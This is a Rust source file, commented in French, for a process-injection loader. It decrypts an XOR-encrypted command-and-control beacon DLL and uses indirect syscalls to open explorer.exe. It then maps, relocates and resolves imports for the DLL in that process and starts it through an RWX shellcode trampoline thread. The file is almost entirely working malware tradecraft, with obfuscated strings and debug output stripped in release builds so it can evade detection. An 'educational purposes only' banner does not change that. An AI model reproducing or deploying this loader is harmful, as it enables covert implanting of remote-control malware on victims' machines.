/*
    ============================================================
    LOADER v7 - PE Loader + IAT + Trampoline
    ============================================================

    Ce loader utilise le nouveau PE Loader de c2_common pour
    injecter la beacon dans un processus cible.

    Techniques utilisées:
    - PE Parsing complet (c2_common::pe)
    - Indirect syscalls (c2_common::syscalls)
    - Remote PE Loading (allocation + mapping + relocs + IAT)
    - Minimum process rights
    - Trampoline pour DllMain

    USAGE EDUCATIF UNIQUEMENT
*/

// ============================================================
// MACROS DEBUG - Supprimées en release
// ============================================================

macro_rules! debug_println {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        println!($($arg)*)
    };
}

macro_rules! debug_eprintln {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        eprintln!($($arg)*)
    };
}

// ============================================================
// IMPORTS
// ============================================================

use c2_common::pe::{PeParser, IMAGE_ORDINAL_FLAG64};
use c2_common::{obf_str, syscall};

use libc::c_void;
use std::ffi::CString;
use std::ptr::null_mut;

use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntexapi::{SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};

// ============================================================
// CONSTANTES
// ============================================================

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READWRITE: u32 = 0x40; // Nécessaire pour le trampoline
const MEM_COMMIT_RESERVE: u32 = 0x3000;

// Droits minimum pour injection
const PROCESS_CREATE_THREAD: u32 = 0x0002;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const PROCESS_VM_READ: u32 = 0x0010;
const MINIMUM_ACCESS: u32 =
    PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

// ============================================================
// BEACON EMBARQUÉE
// ============================================================

// Beacon chiffrée en XOR (test_dll ou beacon.dll)
const BEACON_BYTES_ENC: &[u8] = include_bytes!("../../beacon.dll.enc");
const XOR_KEY: &[u8] = b"A"; // Clé XOR simple (0x41)

/// Déchiffre la beacon au runtime
#[inline(always)]
fn decrypt_beacon() -> Vec<u8> {
    BEACON_BYTES_ENC
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
        .collect()
}

// ============================================================
// FONCTIONS HELPER
// ============================================================

/// Génère un shellcode trampoline pour appeler DllMain
/// Arguments DllMain: (hinstDLL, fdwReason, lpvReserved)
/// RCX est passé par NtCreateThreadEx (lpParameter = BaseAddress)
fn generate_trampoline(entry_point_rva: u32) -> Vec<u8> {
    let mut shellcode = Vec::new();

    // 1. mov edx, 1 (DLL_PROCESS_ATTACH)
    shellcode.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);

    // 2. xor r8d, r8d (lpvReserved = NULL)
    shellcode.extend_from_slice(&[0x45, 0x31, 0xC0]);

    // 3. mov rax, rcx (rax = BaseAddress)
    shellcode.extend_from_slice(&[0x48, 0x89, 0xC8]);

    // 4. add rax, entry_point_rva (rax = EntryPoint)
    shellcode.extend_from_slice(&[0x48, 0x05]);
    shellcode.extend_from_slice(&entry_point_rva.to_le_bytes());

    // 5. sub rsp, 0x28 (Align stack + Shadow space)
    shellcode.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // 6. call rax
    shellcode.extend_from_slice(&[0xFF, 0xD0]);

    // 7. add rsp, 0x28
    shellcode.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

    // 8. ret
    shellcode.push(0xC3);

    shellcode
}

/// Trouve le PID d'un processus par son nom
fn find_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        let buffer_size: u32 = 1024 * 1024;
        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
        let mut return_length: u32 = 0;

        let status: i32 = syscall!(
            "NtQuerySystemInformation",
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut return_length as *mut u32
        );

        if status != 0 {
            debug_eprintln!("[!] NtQuerySystemInformation failed: {:#X}", status);
            return None;
        }

        let mut offset = 0usize;
        loop {
            let entry = &*(buffer.as_ptr().add(offset) as PSYSTEM_PROCESS_INFORMATION);

            if !entry.ImageName.Buffer.is_null() && entry.ImageName.Length > 0 {
                let name_slice = std::slice::from_raw_parts(
                    entry.ImageName.Buffer,
                    (entry.ImageName.Length / 2) as usize,
                );
                let name = String::from_utf16_lossy(name_slice).to_lowercase();

                if name == target_name.to_lowercase() {
                    return Some(entry.UniqueProcessId as u32);
                }
            }

            if entry.NextEntryOffset == 0 {
                break;
            }
            offset += entry.NextEntryOffset as usize;
        }
    }
    None
}

/// Injecte une DLL dans un processus distant en utilisant le PE Loader
fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
    debug_println!("[*] Target PID: {}", target_pid);
    debug_println!("[*] DLL size: {} bytes", dll_bytes.len());

    // Parser la DLL pour obtenir les infos nécessaires
    let pe = PeParser::parse(dll_bytes).map_err(|e| format!("PE parse error: {}", e))?;

    debug_println!("[*] PE parsed successfully");
    debug_println!("    Image size: {} bytes", pe.size_of_image());
    debug_println!("    Entry point RVA: 0x{:X}", pe.entry_point_rva());

    unsafe {
        // =====================================================
        // ÉTAPE 1: NtOpenProcess
        // =====================================================
        debug_println!("\n[STEP 1] NtOpenProcess");

        let mut h_process: HANDLE = null_mut();
        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

        let mut client_id = CLIENT_ID {
            UniqueProcess: target_pid as HANDLE,
            UniqueThread: null_mut(),
        };

        let status: NTSTATUS = syscall!(
            "NtOpenProcess",
            &mut h_process as *mut HANDLE,
            MINIMUM_ACCESS,
            &mut obj_attr as *mut OBJECT_ATTRIBUTES,
            &mut client_id as *mut CLIENT_ID
        );

        if status != STATUS_SUCCESS {
            return Err(format!("NtOpenProcess failed: {:#X}", status));
        }
        debug_println!("[+] Process handle: {:p}", h_process);

        // =====================================================
        // ÉTAPE 2: NtAllocateVirtualMemory (remote)
        // =====================================================
        debug_println!("\n[STEP 2] NtAllocateVirtualMemory");

        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = pe.size_of_image() as usize;

        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address as *mut _ as *mut _,
            0usize,
            &mut region_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
        }
        debug_println!("[+] Remote memory at: {:p}", base_address);

        // =====================================================
        // ÉTAPE 3: Mapper la DLL localement pour préparer
        // =====================================================
        debug_println!("\n[STEP 3] Prepare mapped image locally");

        // Allouer un buffer local pour mapper l'image
        let image_size = pe.size_of_image() as usize;
        let mut mapped_image = vec![0u8; image_size];

        // Copier les headers
        let headers_size = pe.size_of_headers() as usize;
        mapped_image[..headers_size].copy_from_slice(&dll_bytes[..headers_size]);

        // Mapper les sections
        for section in &pe.sections {
            let dest_offset = section.virtual_address as usize;
            if section.size_of_raw_data > 0 {
                let src_offset = section.pointer_to_raw_data as usize;
                let copy_size = std::cmp::min(
                    section.size_of_raw_data as usize,
                    section.virtual_size as usize,
                );
                if src_offset + copy_size <= dll_bytes.len()
                    && dest_offset + copy_size <= mapped_image.len()
                {
                    mapped_image[dest_offset..dest_offset + copy_size]
                        .copy_from_slice(&dll_bytes[src_offset..src_offset + copy_size]);
                }
            }
        }

        // Appliquer les relocations pour la nouvelle base
        let delta = (base_address as u64).wrapping_sub(pe.image_base()) as i64;
        if delta != 0 && pe.has_relocations() {
            for (block, entries) in pe.iter_relocations() {
                for entry in entries {
                    let reloc_type = entry.reloc_type();
                    let offset = entry.offset() as u32;
                    let addr = (block.virtual_address + offset) as usize;

                    if addr + 8 > mapped_image.len() {
                        continue;
                    }

                    match reloc_type {
                        c2_common::pe::IMAGE_REL_BASED_DIR64 => {
                            let ptr = mapped_image.as_mut_ptr().add(addr) as *mut i64;
                            *ptr = (*ptr).wrapping_add(delta);
                        }
                        c2_common::pe::IMAGE_REL_BASED_HIGHLOW => {
                            let ptr = mapped_image.as_mut_ptr().add(addr) as *mut i32;
                            *ptr = (*ptr).wrapping_add(delta as i32);
                        }
                        _ => {}
                    }
                }
            }
        }
        debug_println!("[+] Image mapped and relocated");

        // =====================================================
        // ÉTAPE 3.5: Resolve Imports (IAT)
        // =====================================================
        debug_println!("\n[STEP 3.5] Resolve Imports");

        if pe.has_imports() {
            for (desc, dll_name) in pe.iter_imports() {
                // Charger la DLL (dans le loader local) pour avoir son handle
                // Comme on est sur la même machine, les adresses des DLL système sont identiques
                let dll_cstr = match CString::new(dll_name) {
                    Ok(s) => s,
                    Err(_) => continue,
                };

                let h_module = LoadLibraryA(dll_cstr.as_ptr());
                if h_module.is_null() {
                    debug_eprintln!("[!] Failed to load DLL: {}", dll_name);
                    continue;
                }

                // Itérer sur les thunks (ILT)
                let mut thunk_rva = desc.original_first_thunk;
                if thunk_rva == 0 {
                    thunk_rva = desc.first_thunk;
                }

                let mut iat_rva = desc.first_thunk;

                loop {
                    // Lire le thunk data (u64)
                    let thunk_data: u64 = match pe.read_struct_at_rva(thunk_rva) {
                        Some(val) => val,
                        None => break,
                    };

                    if thunk_data == 0 {
                        break;
                    }

                    let func_addr: u64;

                    // Vérifier si import par ordinal ou nom
                    if (thunk_data & IMAGE_ORDINAL_FLAG64) != 0 {
                        // Import par ordinal
                        let ordinal = (thunk_data & 0xFFFF) as u64;
                        func_addr = GetProcAddress(h_module, ordinal as *const i8) as u64;
                    } else {
                        // Import par nom
                        let name_rva = (thunk_data & 0x7FFFFFFF) as u32;
                        // hint (2 bytes) + name (ascii)
                        // On saute le hint
                        if let Some(func_name) = pe.read_cstr_at_rva(name_rva + 2) {
                            if let Ok(func_cstr) = CString::new(func_name) {
                                func_addr = GetProcAddress(h_module, func_cstr.as_ptr()) as u64;
                            } else {
                                func_addr = 0;
                            }
                        } else {
                            func_addr = 0;
                        }
                    }

                    // Écrire l'adresse résolue dans l'IAT de l'image mappée
                    if func_addr != 0 {
                        let iat_offset = iat_rva as usize;
                        if iat_offset + 8 <= mapped_image.len() {
                            let iat_ptr = mapped_image.as_mut_ptr().add(iat_offset) as *mut u64;
                            *iat_ptr = func_addr;
                        }
                    } else {
                        debug_eprintln!("[!] Failed to resolve import from {}", dll_name);
                    }

                    thunk_rva += 8;
                    iat_rva += 8;
                }
            }
            debug_println!("[+] Imports resolved (Local IAT patching)");
        }

        // =====================================================
        // ÉTAPE 4: NtWriteVirtualMemory
        // =====================================================
        debug_println!("\n[STEP 4] NtWriteVirtualMemory");

        let mut bytes_written: usize = 0;
        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            base_address,
            mapped_image.as_ptr() as *const c_void,
            mapped_image.len(),
            &mut bytes_written as *mut usize
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
        }
        debug_println!("[+] Written {} bytes", bytes_written);

        // =====================================================
        // ÉTAPE 5: NtProtectVirtualMemory (sections)
        // =====================================================
        debug_println!("\n[STEP 5] NtProtectVirtualMemory (per section)");

        for section in &pe.sections {
            let section_addr =
                (base_address as usize + section.virtual_address as usize) as *mut c_void;
            let mut section_size = section.virtual_size as usize;
            let protection = section.to_protection();
            let mut old_protect: u32 = 0;

            let status: NTSTATUS = syscall!(
                "NtProtectVirtualMemory",
                h_process,
                &mut (section_addr as *mut c_void) as *mut _ as *mut _,
                &mut section_size as *mut usize,
                protection,
                &mut old_protect as *mut u32
            );

            if status != STATUS_SUCCESS {
                debug_eprintln!(
                    "[!] Warning: Failed to protect section {}: {:#X}",
                    section.name_str(),
                    status
                );
            } else {
                debug_println!("[+] Protected {} (0x{:X})", section.name_str(), protection);
            }
        }

        // =====================================================
        // ÉTAPE 6: Trampoline & Execution
        // =====================================================
        debug_println!("\n[STEP 6] Allocating & Writing Trampoline");

        let trampoline_code = generate_trampoline(pe.entry_point_rva());
        let mut trampoline_base: *mut c_void = null_mut();
        let mut trampoline_size: usize = trampoline_code.len(); // Taille exacte ou page ?
                                                                // NtAllocateVirtualMemory arrondit à la page, donc c'est OK

        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut trampoline_base as *mut _ as *mut _,
            0usize,
            &mut trampoline_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_EXECUTE_READWRITE // RWX pour simplifier le POC (Write puis Exec)
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("Failed to allocate trampoline: {:#X}", status));
        }
        debug_println!("[+] Trampoline allocated at: {:p}", trampoline_base);

        // Écrire le trampoline
        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            trampoline_base,
            trampoline_code.as_ptr() as *const c_void,
            trampoline_code.len(),
            &mut bytes_written as *mut usize
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("Failed to write trampoline: {:#X}", status));
        }

        debug_println!("\n[STEP 7] NtCreateThreadEx (via Trampoline)");

        // Créer le thread pointant sur le trampoline
        // lpParameter (RCX) = base_address (Handle DLL pour DllMain)
        let mut thread_handle: *mut c_void = null_mut();

        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFFu32, // THREAD_ALL_ACCESS
            NULL,
            h_process,
            trampoline_base, // StartAddress = Trampoline
            base_address,    // lpParameter = Base Address (passé dans RCX)
            0u32,            // CreateFlags
            0usize,          // ZeroBits
            0usize,          // StackSize
            0usize,          // MaxStackSize
            NULL             // AttributeList
        );

        if status != STATUS_SUCCESS {
            let _: NTSTATUS = syscall!("NtClose", h_process);
            return Err(format!("NtCreateThreadEx failed: {:#X}", status));
        }
        debug_println!("[+] Thread created: {:p}", thread_handle);

        // =====================================================
        // CLEANUP
        // =====================================================
        debug_println!("\n[STEP 8] Cleanup");
        let _: NTSTATUS = syscall!("NtClose", thread_handle);
        let _: NTSTATUS = syscall!("NtClose", h_process);
        debug_println!("[+] Handles closed");

        Ok(())
    }
}

// ============================================================
// MAIN
// ============================================================

fn main() {
    debug_println!(
        r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║   LOADER v7 - PE Loader + IAT + Trampoline                ║
    ║                                                           ║
    ║  Techniques:                                              ║
    ║  ✓ Full PE Loading (parse, map, reloc)                    ║
    ║  ✓ IAT Resolution (same-machine injection)                ║
    ║  ✓ Indirect syscalls                                      ║
    ║  ✓ Minimum process rights                                 ║
    ║  ✓ DllMain Trampoline (arguments correction)              ║
    ║                                                           ║
    ║    FOR EDUCATIONAL PURPOSES ONLY                          ║
    ╚═══════════════════════════════════════════════════════════╝
    "#
    );

    // Déchiffrer la beacon
    debug_println!("[*] Decrypting beacon...");
    let beacon_bytes = decrypt_beacon();
    debug_println!("[+] Beacon decrypted: {} bytes", beacon_bytes.len());

    // Trouver explorer.exe
    debug_println!("\n[*] Searching for explorer.exe...");
    let pid = match find_process_pid(&obf_str!("explorer.exe")) {
        Some(pid) => pid,
        None => {
            debug_eprintln!("[!] explorer.exe not found!");
            std::process::exit(1);
        }
    };
    debug_println!("[+] Found explorer.exe with PID: {}", pid);

    // Injecter
    match inject_pe_remote(pid, &beacon_bytes) {
        Ok(_) => {
            debug_println!("\n════════════════════════════════════════════");
            debug_println!("[✓] SUCCESS: PE injected and executed!");
            debug_println!("════════════════════════════════════════════");
        }
        Err(e) => {
            debug_eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
